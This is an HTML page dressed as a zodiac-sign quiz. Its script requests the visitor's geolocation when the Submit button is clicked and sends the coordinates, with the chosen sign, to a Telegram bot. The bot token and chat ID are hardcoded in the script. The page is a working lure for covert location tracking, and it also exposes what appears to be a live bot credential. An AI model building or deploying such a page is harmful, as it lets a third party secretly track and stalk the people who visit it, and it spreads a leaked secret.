<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zodiac Game Location</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <h2>What is Your Zodiac Sign?</h2>
    <select id="zodiac" name="zodiac">
        <option value="aries">Aries</option>
        <option value="taurus">Taurus</option>
        <option value="gemini">Gemini</option>
        <option value="cancer">Cancer</option>
        <option value="leo">Leo</option>
        <option value="virgo">Virgo</option>
        <option value="libra">Libra</option>
        <option value="scorpio">Scorpio</option>
        <option value="sagittarius">Sagittarius</option>
        <option value="capricorn">Capricorn</option>
        <option value="aquarius">Aquarius</option>
        <option value="pisces">Pisces</option>
    </select>
    <br><br>
    <button onclick="getLocationAndSendMessage()">Submit</button>

    <script>
        function getLocationAndSendMessage() {
            const zodiac = document.getElementById("zodiac").value;
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const message = `Zodiac: ${zodiac} - Location: Latitude = ${latitude}, Longitude = ${longitude}`;
                    sendMessageToTelegram(message);
                }, function(error) {
                    alert("Error getting location.");
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendMessageToTelegram(message) {
            const botToken = '7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk';  // Replace with your Bot's token
            const chatId = '397599597';      // Replace with your Chat ID
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("Location and Zodiac Sent!");
                    } else {
                        alert("Error sending data.");
                    }
                })
                .catch(error => {
                    alert("Error with the request.");
                    console.error("Error:", error);
                });
        }
    </script>

</body>
</html>
